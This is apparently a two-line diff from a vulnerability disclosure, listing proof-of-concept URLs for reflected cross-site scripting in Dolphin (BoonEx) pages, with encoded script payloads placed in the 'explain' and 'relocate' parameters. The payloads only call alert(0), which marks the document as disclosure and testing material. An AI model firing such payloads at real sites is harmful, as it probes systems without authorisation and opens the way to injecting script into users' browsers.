@@ -1,0 +1,2 @@
+http://www.example.com/dolphin/explanation.php?explain=%3Cscript%3Ealert(0)%3C/script%3E 
+http://www.example.com/dolphin/modules/boonex/custom_rss/post_mod_crss.php?relocate=%22%3E%3Cscript%3Ealert(0)%3C/script%3E
